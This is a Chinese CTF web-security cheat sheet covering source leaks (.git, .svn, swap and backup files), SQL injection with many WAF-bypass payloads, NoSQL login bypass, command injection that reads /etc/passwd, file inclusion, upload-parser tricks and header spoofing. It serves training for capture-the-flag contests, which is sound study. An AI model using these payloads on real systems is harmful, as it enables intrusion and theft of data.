#常见套路概述

- 常用爆破，其中就有MD5，验证码识别，爆破随机数。
- sql注入，各种注入技术，绕WAF，花式绕Mysql，绕文件读取关键字检测之类的拦截,sqlmap使用,自动化注入。
- 代码审计，常见的php特性，其中就有弱类型，反序列化+destruct，\0截断，iconv截断
- 密码题中就包括hash长度扩展，异或，移位加密的变形，32位随机数过小，随机数种子可预测
- 各种找源码的技巧，git，svn，xxx，php.swp，*www*...（zip|tar.gz|rar|7z），php~，xxx.php.bak,robots.txt,.bash_history，.xxxx.php.swo
- 文件上传，其中就有文件的后缀，php345.inc.phtml.phpt.phps，各种文件内容检测`<?php<?<%<script language=php>`,花式解析漏洞,截断上传。
- 文件包含，各种php伪协议，本地/远程文件包含，截断，getshell
- 命令执行、代码执行，各种绕过，Linux/php基础
- Mysql类型差异，包括和php弱类型类似的特性，0x，0b，0e之类，varchar和integar相互转换，非strict模式截断等。
- open_basedir，diable_functions花式绕过技巧，包括dl，mail，imagick，bash漏洞，Directorylterator及各种二进制选手插足的方法。
- 条件竞争，包括竞争删除前生成shell，竞争数据库无锁多扣线。
- 社工，花式查社工库，微博，qq签名，whois。
- windows特性，包括短文件名，IIS解析漏洞，NTFs文件系统通配符，::$DATA,冒号截断。
- SSRF，花式探测端口，302跳转，花式协议利用，gophar直接取shell等。
- xss，各种浏览器auditor绕过，富文本过滤黑白名单绕过，flash xss，CSP绕过。
- XXE，各种XML存在地方（rss/word/流媒体），各种XEE利用方法（SSRF，文件读取）。
- 协议，花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP,花式改UA，花式藏FLAG，花式分析数据包，burp使用
- python编程，自动化攻击，post_exp,get_flag,post_flag,爆破，破解，注入
- 漏洞挖掘，构造exp,综合渗透，提权，内网
- 登录框攻击 验证码，注入，万能密码，XSS，cookie,session

#参考文章
http://blog.nsfocus.net/ctf-class-part-2/
http://blog.csdn.net/Sanky0u/article/details/77170651

#web套路简介
1. Information_disclosure

		robots.txt
		
		Comment
		
		vim swap file
		
		.pyc
		
		.git
		
		.svn
		
		bak file(.tar.gz/.rar/.zip/.7z)
1.1 Information_disclosure—robots.txt

		User-agent: *
		Disallow: /cgi-bin/
		
		Disallow: /images/
		
		Disallow: /tmp/

1.2 Information_disclosure—comment

		<html>
		<!— index.phps —>
		<!—
		flag{40be4e59b9a2a2b5dffb918c0e86b3d7}
		!—>
		
		<?php
		/*
		$my_pass = ‘xxx’;
		*/

1.3 Information_disclosure—vim swap file

		.[FILENAME].[EXT].swp
		
		➜  tmp cat .index.php.swp
		U3210#”! Utad«Ր땿>echo “hello world.”;phpinfo();<?php
		
		➜  tmp
		
		$ ~ vim -r .index.php.swp
		
		Using swap file “swap_test/.index.php.swp”
		
		“/tmp/index.php” [New File]
		
		Recovery completed. You should check if everything is OK.
		
		(You might want to write out this file under another name
		
		and run diff with the original file to check for changes)
		
		You may want to delete the .swp file now.
		
		Press ENTER or type command to continue

1.4 Information_disclosure—.git

		$ ls -al
		
		total 73
		
		drwxr-xr-x 1 dengyongkai 197121  0 8月  16 04:14 ./
		
		drwxr-xr-x 1 dengyongkai 197121  0 8月  16 03:37 ../
		
		drwxr-xr-x 1 dengyongkai 197121  0 8月  16 04:16 .git/
		
		drwxr-xr-x 1 dengyongkai 197121  0 8月  16 03:42 asoidfyu_admin/
		
		-rw-r–r– 1 dengyongkai 197121  0 8月  16 03:38 hello.txt
		
		-rw-r–r– 1 dengyongkai 197121 38 8月  16 04:13 index.php
		
		drwxr-xr-x 1 dengyongkai 197121  0 8月  16 04:15 login/
		
		-rw-r–r– 1 dengyongkai 197121  0 8月  16 03:40 xxxxxx_flag.txt
		
		 

$ ~ python GitHack.py http://x.x.x.x/.git/

		[+] Download and parse index file …
		
		asoidfyu_admin/admin.php
		
		hello.txt
		
		index.php
		
		login/index.php
		
		login/login.php
		
		xxxxxx_flag.txt
		
		[OK] asoidfyu_admin/admin.php
		
		[OK] index.php
		
		[OK] login/index.php
		
		[OK] hello.txt
		
		[OK] xxxxxx_flag.txt
		
		[OK] login/login.php

1.5 Information_disclosure—.svn

		.svn < 1.6
		www.xxx.com/.svn/.entries
		
		/.svn/text-base
		example.com/phpinfo.php–>example.com/.svn/text-base/phpinfo.php-text-base
		
		–
		
		auxiliary/scanner/http/svn_scanner
		
		$ ~ perl rip-svn.pl -v -u http://x.x.x.x/.svn/
		
		[i] Found new SVN client storage format!
		REP INFO => 1:file:///private/tmp/repos/ctf:501fa6fa-e6f6-40d6-ac55-a80ebae05199
		[i] Trying to revert the tree, if you get error, upgrade your SVN client!
		Reverted ‘u_can_not_guess’
		Reverted ‘u_can_not_guess/flag’
		Reverted ‘public’
		Reverted ‘admin’
1.6 Information_disclosure—bak file

		total 8
		drwxr-xr-x   6 dengyongkai   wheel   204B 11 26 13:48 .
		drwxrwxrwt  20 root  wheel   680B 11 26 13:40 ..
		drwxr-xr-x   2 dengyongkai   wheel    68B 11 26 13:34 admin
		drwxr-xr-x   2 dengyongkai   wheel    68B 11 26 13:34 public
		drwxr-xr-x   3 dengyongkai   wheel   102B 11 26 13:34 u_can_not_guess
		-rw-r–r–   1 dengyongkai   wheel   217B 11 26 13:48 web.tar.gz
		-rw-r–r–   1 dengyongkai   wheel   217B 11 26 13:48 web.zip
		-rw-r–r–   1 dengyongkai   wheel   217B 11 26 13:48 web.rar

1.7 Information_disclosure——etc

	    NFS
	    Samba
	    FTP
	    ……

2. sql_injection

	    mysql
	    pSqlite
	    pSql server
	    pOracle
	    pAccess
	    p……

2.1 sql_injection—mysql

	    Order by num
	    and 1=1 union select 1,2,3,4,5…….n/*
	    and 1=2 union select 1,2,3,4,5…..n/*
	    and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
	    and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=hex(database) limit 0,1
	    and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=hex(table) limit 0,1
	    Union select 1,2,3concat(username,0x3c,password),5,6,7,8,9 from table limit 0,1
	
	    Extractvalue
	    and extractvalue(1, concat(0x5c, (select table_namefrom information_schema.tableslimit 1)));
	    UpdateXml
	    and 1=(updatexml(1,concat(0x3a,(select user())),1))

2.2 sql_injection—mysql bypass

绕过WAF的几种常见方法：
	a) 大小写混合
	
	用于只针对小写或大写的关键字匹配技术，正则表达式匹配时大小写不敏感无法绕过。
	
	abc.com/index.php?page_id=-1 uNIoN sELecT 1,2,3,4

	b)替换关键字（ and->&&、or->|| %0b代替空格）
	
	正则表达式替换或删除select、union等关键字，且只匹配一次。
	uniunionon
	
	abc.com/index.php?page_id=-1 UNIunionON SELselectECT 1,2,3,4

	c)使用编码 （url编码、16进制）
	
	使用编码——url编码
	
	普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过
	
	page.php?id=1%252f%252a*/UNION%252f%252a/SELECT
	
	page.php?id=1%2f%2a*/UNION%2f%2a/SELECT 一次解码
	
	page.php?id=1/**/UNION/*/SELECT   两次解码
	
	使用编码——十六进制编码
	
	abc.com/index.php?page_id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
	
	abc.com/index.php?page_id=-1 /*!union*/ /*!select*/ 1,2,3,4,SELECT(extractvalue(<a>admin</a>, /a))
	
	使用编码——Unicode编码
	
	单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
	
	空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
	
	左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
	
	右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
	
	Page.php?id=1%D6’%20AND%201=2%23
	
	对单引号转义操作变成\‘，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用。
	
	d)使用注释 （/**/代替空格、–、#）
	
	使用注释——普通注释
	
		常见的注释符号：//, — , /**/, #, –+,–  -, ;–a
		
		abc.com/index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4
		‘union%a0select pass from users#
		/**/在构造的查询语句中插入注释规避对空格的依赖或关键字识别
		#、–+用于终结语句的查询
	
	使用注释——内联注释
	
		index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
		
		index.php?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…
		
		/*!content*/只有MySQL会正常识别content的内容

	e)等价函数与命令 （updatexml（，select语句）、extractvalue（，）、floor、）
	
	等价函数与命令——生僻函数
	
		MySQL/PostgreSQL支持XML函数
		
		Select UpdateXML(‘<script x=_></script> ‘,’/script/@x/’,’src=//evil.com’);
		
		?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
		
		SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror));　//postgresql
		
		?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
	
	等价函数与命令——特殊符号
	
		1.使用反引号，例如select version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
		
		2.神奇的”-+.”，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
		
		3.@符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量
		
		4.Mysql function() as xxx  也可不用as和空格
		
		select-count(id)test from users;  //绕过空格限制
		
		例如关键字拆分：’se’+’lec’+’t’
		
		%S%E%L%E%C%T 1
		
		aspx?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell “net user”‘)

	f)使用特殊符号 （ –、# ）
		g)HTTP参数控制 （GET请求转换为POST请求）
		
		HTTP参数污染——HPP（HTTP Parameter Polution）
		
		HTTP又称做重复参数污染，对于?uid=1&uid=2&uid=3这种情况不同的Web服务器处理方式如下
		
		/?id=1;select+1&id=2,3+from+users+where+id=1—
		
		/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users

	h)缓冲区溢出
	i)整合绕过

	2.3 nosql_injection—mongodb
	
	…
	
	$collection->find(array(
	
	“username” => $_GET[‘username’],
	
	“password” => $_GET[‘password’]
	
	));
	…
	
	http://x.x.x.x/login.php?username=admin&password[$ne]=1
	
	$collection->find(array(
	
	“username” => “admin”,
	
	“password” => array(“$ne” => 1)
	
	));
	
	$gt
	
	$gte
	
	$lt
	
	$lte
	
	$in
	
	$ne
	
	$and
	
	$not
	
	$or
	
	$exists
	
	$mod

2.4 command_injection

	<?php
	
	if (isset($_GET[‘ip’])) {
	
	$cmd = ‘ping -c1 ‘.$_GET[‘ip’];
	
	system($cmd);
	
	}

 

	http://localhost/index.php?ip=;cat+/etc/passwd
	
	root:x:0:0:root:/root:/bin/bash
	
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	
	sync:x:4:65534:sync:/bin:/bin/sync
	
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	
	… … … … …

 

	$ ~ man wget

	HTTP options:
	
	……
	
	–post-file=FILE        use the POST method; send contents of FILE.

……

3. LFI/RFI

    <?php
    include($_GET[‘file’]);?>
    index.php?file=xxx/yyy/zzz.jpg

3.1 LFI

	<?php
	
	if (strtolower( substr( $include_file, -4 ) ) == “.php” )
	
	{
	
	require( $_GET[file] );
	
	}?>

	index.php?file=phar:///var/www/uploads/xxx.jpg/1.php

3.2 RFI

    allow_url_include = on
    Index.php?file=\\192.168.100.1\share\xxx.php

3.3 各种php协议
	php://input
	php://filter
	php://data
	
	4. File Upload
	
	move_upload_file($_FILE[“file”][“tmp_name”],$_FILE[“file”][“name”]);
	
	 
	
	Content-Type: image/jpeg
	
	Content-Type: application/x-www-form-urlencoded;
	
	Content-Type: multipart/form-data;
	
	 
	
	Content-Disposition: form-data; name=“fileupload”;filename=“test.jpg”
	
	Content-Disposition: form-data; name=“fileupload”;filename=“test.php”
	
	Content-Disposition: form-data; name=“fileupload”;filename=“test.jpg”;filename=“test.php”

 

    解析漏洞
    Apache: index.php.xxx, php3/4/5, PHP
    IIS: cer, asa, cdx, htr; index.asp/x.jgp; index.asp;.jpg
    Nginx: index.zzz/x.php
    MAC：config.php、config.phP
    Ubuntu：config.php（config.pht）
    Windows：config.php，config.phP，config.ph<，config.ph>， config.ph*，config.ph?
    %00

5. HTTP协议

		Method
		Host
		User-Agent
		Referer
		X-Forwarded-For
		Accept-Language
		Cookie
